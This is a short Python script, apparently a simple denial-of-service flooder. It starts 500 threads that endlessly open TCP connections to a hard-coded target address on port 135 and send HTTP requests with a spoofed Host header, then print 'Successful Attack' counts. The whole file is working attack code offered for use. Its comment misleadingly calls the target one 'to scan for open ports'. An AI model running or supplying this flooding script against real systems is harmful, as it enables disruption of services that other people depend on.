import socket
import threading

target = "192.168.1.11" # The target IP address to scan for open ports.
port = 135
# i = 1
fake_ip = "182.21.20.32"
already_connected = 0
def attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target,port))
            sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"),(target,port))
            sock.sendto(("HOST: " + fake_ip + " \r\n\r\n").encode("ascii"),(target,port))
            sock.close()
            
            global already_connected 
            already_connected = already_connected + 1
            if already_connected % size == 0 :
                print("Successful Attack",already_connected)
                # i = i + 1
        except:
            print("Disconnected!!!")           

size = 500
thread_list = []
for i in range(size):
    thread = threading.Thread(target=attack)
    # thread.start()
    thread_list.append(thread)
    
for thread in thread_list:
    thread.start()
    
for thread in thread_list:
    thread.join()